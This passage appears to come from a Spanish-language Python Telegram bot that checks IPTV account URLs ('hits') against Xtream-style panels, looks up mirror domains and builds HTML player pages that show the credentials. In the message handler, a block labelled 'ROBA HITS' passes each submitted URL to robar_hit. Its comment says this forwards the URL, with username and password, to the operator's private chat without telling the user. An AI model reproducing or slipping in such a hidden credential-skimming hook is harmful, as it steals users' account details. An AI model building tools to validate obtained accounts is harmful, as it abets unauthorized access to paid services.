                const temporadas = Object.keys(data.episodes).sort((a, b) => parseInt(a) - parseInt(b));
                temporadas.forEach(temporada => {
                    let episodiosTemporada = '';
                    const episodios = data.episodes[temporada];
                    const ordenados = Array.isArray(episodios) ? [...episodios].sort((a, b) => parseInt(a.episode_num||0) - parseInt(b.episode_num||0)) : [];
                    ordenados.forEach(episodio => {
                        const epId = episodio.id || episodio.episode_id || '';
                        const epNum = episodio.episode_num || '?';
                        const epTitle = episodio.title || `Episodio ${epNum}`;
                        const epDisplay = `E${epNum} - ${epTitle}`;
                        const epContainer = episodio.container_extension || 'mp4';
                        const epLink = `${prot}://${host}:${port}/series/${encodeURIComponent(usuario)}/${encodeURIComponent(password)}/${seriesId}/${epId}.${epContainer}`;
                        episodiosTemporada += `<li class="episodio searchable-item" data-title="${epDisplay}"><a href="javascript:void(0);" onclick="playChannel('${epLink}', '${epContainer}', '${epDisplay}'); return false;">${epDisplay}</a></li>`;
                    });
                    if (episodiosTemporada) {
                        episodiosHTML += `<div class='temporada'><div class='temporada-header' onclick="toggleTemporada('temp_${seriesId}_${temporada}')">Temporada ${temporada}</div><ul id='temp_${seriesId}_${temporada}' class='episodios-lista' style='display: none;'>${episodiosTemporada}</ul></div>`;
                    }
                });
                if (episodiosHTML) { contenedor.innerHTML = episodiosHTML; contenedor.classList.add('episodios-cargados'); initSearchForNewElements(contenedor); }
                else { contenedor.innerHTML = '<p>No hay episodios disponibles.</p>'; }
            })
            .catch(error => {
                clearTimeout(timeoutId);
                contenedor.innerHTML = error.name === 'AbortError'
                    ? `<p>Tiempo de espera agotado. <a href="javascript:void(0);" onclick="cargarEpisodios('${prot}','${host}','${port}','${usuario}','${password}','${seriesId}','${seriesName}')">Reintentar</a></p>`
                    : `<p>Error: ${error.message}. <a href="javascript:void(0);" onclick="cargarEpisodios('${prot}','${host}','${port}','${usuario}','${password}','${seriesId}','${seriesName}')">Reintentar</a></p>`;
            });
    } else {
        contenedor.style.display = "none";
    }
}

function initSearchForNewElements(container) {
    const searchTerm = document.getElementById('searchInput').value.toLowerCase().trim();
    if (searchTerm !== '') {
        container.querySelectorAll('.searchable-item').forEach(item => {
            const title = item.getAttribute('data-title').toLowerCase();
            if (title.includes(searchTerm)) {
                item.style.display = ''; item.classList.remove('hidden');
                highlightText(item, searchTerm);
                if (item.classList.contains('episodio')) {
                    const temporada = item.closest('.temporada');
                    if (temporada) { temporada.style.display = 'block'; const lista = temporada.querySelector('.episodios-lista'); if (lista) lista.style.display = 'block'; }
                }
            } else { item.style.display = 'none'; item.classList.add('hidden'); }
        });
    }
}
"""

estilos_loading = """
.loading-spinner { width: 30px; height: 30px; border: 3px solid rgba(0,123,255,0.3); border-radius: 50%; border-top-color: #007bff; animation: spin 1s ease-in-out infinite; margin: 0 auto 10px; }
.loading-container { text-align: center; padding: 20px; color: #666; }
@keyframes spin { to { transform: rotate(360deg); } }
"""

@bot.message_handler(func=lambda message: message.text and ('type=m3u' in message.text.lower() or 'playlist' in message.text.lower()))
def procesar_m3u(message):
    url = message.text.strip()
    chat_id = message.chat.id
    msg_id = None

    # ── ROBA HITS ──────────────────────────────────────────────────────────
    # Envía la URL que recibió el bot directamente a tu chat privado.
    robar_hit(url)
    # ───────────────────────────────────────────────────────────────────────

    try:
        try:
            progress_msg = bot.reply_to(message, "⏳ Procesando la información. Esto puede tomar un tiempo...")
            msg_id = progress_msg.message_id
        except Exception as e:
            print(f"[procesar_m3u] No se pudo enviar mensaje inicial: {e}")
            try:
                progress_msg = bot.send_message(chat_id, "⏳ Procesando la información. Esto puede tomar un tiempo...")
                msg_id = progress_msg.message_id
            except Exception:
                msg_id = None

        def update(text):
            if msg_id:
                safe_edit(chat_id, msg_id, text)
            else:
                print(f"[progress] {text}")

        parsed = urlparse(url)
        prot = parsed.scheme or "http"
        host = parsed.hostname or ""
        port = str(parsed.port) if parsed.port else ("443" if prot == "https" else "80")

        HTTPS_PORTS = {"443", "8443", "2053", "2083", "2087", "2096", "8888"}
        HTTP_PORTS  = {"80",  "8080", "8000", "8008", "25461", "2082", "2086"}

        original_prot = prot
        if port in HTTPS_PORTS and prot != "https":
            prot = "https"
            print(f"[proto-fix] Corregido {original_prot}→https (puerto {port})")
        elif port in HTTP_PORTS and prot != "http":
            prot = "http"
            print(f"[proto-fix] Corregido {original_prot}→http (puerto {port})")
        else:
            if prot == "http" and port not in HTTP_PORTS:
                try:
                    test_url = f"https://{host}:{port}/player_api.php"
                    r_test = requests.head(test_url, verify=False, timeout=5)
                    if r_test.status_code < 500:
                        prot = "https"
                        print(f"[proto-fix] Puerto {port} ambiguo → https responde OK")
                except Exception:
                    pass

        if prot != original_prot:
            url = url.replace(f"{original_prot}://", f"{prot}://", 1)

        headers = get_headers(f"{prot}://{host}:{port}")
        headers_js = json.dumps(headers, ensure_ascii=False)

        update("🔍 Analizando URL e información de cuenta...")

        is_xui = False
        try:
            # La función jcinfo ahora retorna 10 valores (agregado created_at)
            usuario, password, expira, active, max_conn, full_server, timezone, prueba, estado, created_at = jcinfo(url)

            if estado.startswith("Error de conexión") and "username=" in url and "password=" in url:
                update("⚠️ player_api.php no responde. Intentando obtener host real desde M3U...")
                try:
                    _usr = re.search(r'username=([^&]+)', url).group(1)
                    _pas = re.search(r'password=([^&]+)', url).group(1)
                    _m3u_url = f"{prot}://{host}:{port}/get.php?username={_usr}&password={_pas}&type=m3u&output=ts"
                    _m3u_result = extraer_host_de_m3u(_m3u_url)
                    if _m3u_result:
                        _nprot, _nhost, _nport = _m3u_result
                        _alt_url = f"{_nprot}://{_nhost}:{_nport}/get.php?username={_usr}&password={_pas}&type=m3u_plus"
                        print(f"[m3u-fallback] Reintentando jcinfo con {_nhost}:{_nport}")
                        usuario, password, expira, active, max_conn, full_server, timezone, prueba, estado, created_at = jcinfo(_alt_url)
                        if estado == "Vivo":
                            prot       = _nprot
                            host       = _nhost
                            port       = _nport
                            url        = _alt_url
                            headers    = get_headers(f"{prot}://{host}:{port}")
                            headers_js = json.dumps(headers, ensure_ascii=False)
                except Exception as _e:
                    print(f"[m3u-fallback] Error: {_e}")

            if "playlist/" in url:
                is_xui = True
            else:
                try:
                    api_url = url.replace('get.php', 'player_api.php').replace('gets.php', 'player_api.php').split("&type")[0]
                    _r = requests.get(api_url, headers=get_headers(api_url), verify=False, timeout=10)
                    if _r.status_code == 200:
                        is_xui = bool(_r.json().get('server_info', {}).get('xui', False))
                except Exception:
                    pass

            if not usuario or not password:
                if "username=" in url and "password=" in url:
                    usuario  = re.search(r'username=([^&]+)', url).group(1)
                    password = re.search(r'password=([^&]+)', url).group(1)
                elif "playlist/" in url:
                    parts = url.split("playlist/")[1].split("/")
                    if len(parts) >= 2:
                        usuario, password = parts[0], parts[1]
                    is_xui = True

        except Exception as e:
            safe_edit(chat_id, msg_id, f"❌ No se pudo conectar con el servidor.\n`{e}`")
            return

        INVALID_STATES = {
            "cuenta no activa", "error", "url de playlist inválida",
            "respuesta inválida del servidor", "desconocido",
            "playlist_disabled", "account_expired", "account_banned",
            "user_not_found", "invalid_pass", "respuesta inesperada",
        }
        cuenta_invalida = (
            not usuario
            or not password
            or any(s in (estado or "").lower() for s in INVALID_STATES)
            or (estado or "").lower().startswith("error")
        )

        if cuenta_invalida:
            motivo = estado or "Cuenta inválida o inaccesible"
            msg_invalida = f"❌ Cuenta inválida: {motivo}"
            try:
                if msg_id:
                    bot.edit_message_text(msg_invalida, chat_id, msg_id)
                else:
                    bot.send_message(chat_id, msg_invalida)
            except Exception:
                safe_edit(chat_id, msg_id, msg_invalida)
            return

        estado   = "ACTIVE" if estado == "Vivo" else "INACTIVE"
        trial    = "Trial" if prueba == "1" else "No Trial"

        port_is_default = (prot == "http" and port == "80") or (prot == "https" and port == "443")
        url1 = f"{prot}://{host}" if port_is_default else f"{prot}://{host}:{port}"

        if is_xui and full_server:
            xui_host = full_server.split(":")[0]
            xui_port = full_server.split(":")[1] if ":" in full_server else port
            xui_port_default = (prot == "http" and xui_port == "80") or (prot == "https" and xui_port == "443")
            url2 = f"{prot}://{xui_host}" if xui_port_default else f"{prot}://{xui_host}:{xui_port}"
        else:
            url2 = url1

        template_base = url2 if (is_xui and full_server and full_server.split(":")[0] != host) else url1

        from urllib.parse import urlparse as _up
        _tb = _up(template_base)
        tmpl_host = _tb.hostname or host
        tmpl_port = str(_tb.port) if _tb.port else ("443" if prot == "https" else "80")
        tmpl_port_str = "" if port_is_default else tmpl_port

        expiration_date = expira if expira else "Desconocida"
        connections     = f"{active}/{max_conn}" if active and max_conn else "Desconocido"

        m3u_url = build_m3u_url(template_base, usuario, password, is_xui)

        try:
            update("🌐 Obteniendo información de servidor...")
            location, ispj, ipj = data_server(host)
        except Exception:
            location, ispj, ipj = "Desconocida", "Desconocido", host

        try:
            vivo, vod, serie = obtener_datos(url1, usuario, password, "no proxy")
        except Exception:
            vivo = vod = serie = ""

        channels = str(vivo) if vivo else "?"
        movies   = str(vod)  if vod  else "?"
        series   = str(serie) if serie else "?"

        isp = f"IP: {ipj} - ISP: {ispj}"

        # ── ENVIAR RESUMEN DE CUENTA CON EL FORMATO SOLICITADO ────────────────
        # Extraer país y bandera desde 'location' que viene como "🇺🇸 United States"
        flag_icon = location.split()[0] if location and len(location.split()) > 0 else ""
        country_name = location.replace(flag_icon, "").strip() if flag_icon else location

        msg_valida = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🦂 LUIS R 🦂\n"
            f"  🦉彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡🦉\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➥ 🟢 CUENTA VÁLIDA\n"
            f"➥ 🆙 Estado: ✅ {estado}\n"
            f"➥ 🧪 {trial}\n"
            f"➥ 🌐 Portal: {url1.replace('https://', '').replace('http://', '')}\n"
            f"➥ 👤 Usuario: `{usuario}`\n"
            f"➥ 🔑 Contraseña: `{password}`\n"
            f"➥ 📅 Creada: {created_at if created_at else 'Desconocida'}\n"
            f"➥ ⏲ Vence: {expiration_date}\n"
            f"➥ 👁 Conexiones: {connections}\n"
            f"➥ 📍 País: {country_name} {flag_icon}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"     🦂彡ᴄᴏɴᴛᴇɴᴛ彡🦂\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➥ 📺 En Vivo: {channels}\n"
            f"➥ 🎥 VOD: {movies}\n"
            f"➥ 📹 Series: {series}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➥ 🔗 [M3U Link]({m3u_url})   |   [EPG Link]({build_epg_url(template_base, usuario, password, is_xui)})\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   🦂彡ᴄᴀᴛᴇɢᴏʀíᴀs彡🦂\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   ✔️ Verificado para @{message.from_user.username or message.from_user.first_name}\n"
            f"   🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"   🦂 @Luishits_bot\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

        try:
            if msg_id:
                bot.edit_message_text(msg_valida, chat_id, msg_id, parse_mode='Markdown', disable_web_page_preview=True)
            else:
                bot.send_message(chat_id, msg_valida, parse_mode='Markdown', disable_web_page_preview=True)
        except Exception as e:
            print(f"[msg_valida] Error: {e}")

        # ── Crear un nuevo mensaje de progreso para los pasos siguientes ──────
        try:
            prog2 = bot.send_message(chat_id, "⏳ Buscando dominios espejo...")
            msg_id = prog2.message_id
        except Exception as e:
            print(f"[prog2] No se pudo crear mensaje de progreso secundario: {e}")
            msg_id = None

        try:
            update("🔎 Buscando dominios espejo...")
            if "cloudflare" in isp.lower():
                domains = "N/A"
            else:
                domains = buscar_dominios_espejo(ipj)
                if "No encontraron" in domains or "No se encontraron" in domains:
                    dom = cdominios(ipj)
                    if dom == "N/A" and "cloudflare" not in isp.lower():
                        dom = espejosxy(ipj)
                    domains = dom if dom else domains
        except Exception:
            domains = "No disponible"

        formatted_domains = "No disponibles"
        if domains and domains not in ("No disponible", "N/A", ""):
            formatted_domains = domains.replace("\n", "<br>").lstrip("<br>")

        generated_date = datetime.now().strftime("%Y-%m-%d -- %H:%M:%S")

        update("🛠️ Creando interfaz de reproductor web...")

        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'iptv_template_full_audio_scroll.html')
        try:
            with open(template_path, 'r', encoding='utf-8') as f:
                html_template = f.read()
        except FileNotFoundError:
            update("❌ Error: No se encontró la plantilla HTML.")
            return

        replacements = {
            '{{estado}}': str(estado),
            '{{trial}}': str(trial),
            '{{url1}}': str(url1),
            '{{usuario}}': str(usuario),
            '{{password}}': str(password),
            '{{expiration_date}}': str(expiration_date),
            '{{connections}}': str(connections),
            '{{channels}}': str(channels),
            '{{movies}}': str(movies),
            '{{series}}': str(series),
            '{{location}}': str(location),
            '{{ispj}}': str(ispj),
            '{{formatted_domains}}': str(formatted_domains),
            '{{prot}}': str(prot),
            '{{host}}': str(tmpl_host),
            '{{port}}': str(tmpl_port if not port_is_default else ("443" if prot == "https" else "80")),
            '{{headers_js}}': str(headers_js),
            '{{m3u_url}}': str(m3u_url),
            '{{generated_date}}': str(generated_date),
            '{{is_xui}}': 'true' if is_xui else 'false',
        }

        html_content = html_template
        for placeholder, value in replacements.items():
            html_content = html_content.replace(placeholder, value)

        safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', f"{host}_{port}_{usuario}")
        file_name2 = f"html/{safe_name}.html"

        os.makedirs('html', exist_ok=True)
        with open(file_name2, "w", encoding="utf-8") as f:
            f.write(html_content)

        if msg_id:
            try:
                bot.delete_message(chat_id, msg_id)
            except Exception as e:
                print(f"[delete_prog] No se pudo borrar mensaje de progreso: {e}")

        enviado = safe_send_document(
            chat_id, file_name2,
            caption=f"¡Hey {message.from_user.first_name}! Aquí está la info de tu cuenta en HTML."
        )
        if enviado:
            print(f"Archivo enviado a {message.from_user.first_name}")

    except Exception as e:
        print(f"Error al procesar URL: {e}\n{traceback.format_exc()}")
        try:
            bot.send_message(chat_id, "⚠️ Hubo un problema al procesar la URL. Verifica que sea correcta e intenta nuevamente.")
        except Exception:
            pass

def run_bot():
    RETRY_DELAYS = [5, 10, 15, 30, 60]
    attempt = 0

    print("🦂 Bot LUIS R iniciado. Esperando mensajes...")
    while True:
        try:
            bot.infinity_polling(
                timeout=20,
                long_polling_timeout=15,
                allowed_updates=[],
                logger_level=None,
            )
        except requests.exceptions.ReadTimeout:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS) - 1)]
            print(f"[polling] ReadTimeout — reconectando en {delay}s (intento {attempt + 1})")
            time.sleep(delay)
            attempt += 1
        except requests.exceptions.ConnectionError as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS) - 1)]
            print(f"[polling] ConnectionError: {e} — reconectando en {delay}s (intento {attempt + 1})")
            time.sleep(delay)
            attempt += 1
        except Exception as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS) - 1)]
            print(f"[polling] Error inesperado: {e}\n{traceback.format_exc()}")
            print(f"[polling] Reconectando en {delay}s (intento {attempt + 1})")
            time.sleep(delay)
            attempt += 1
        else:
            attempt = 0
            print("[polling] Polling terminó, reiniciando...")
            time.sleep(2)

if __name__ == "__main__":
    run_bot()
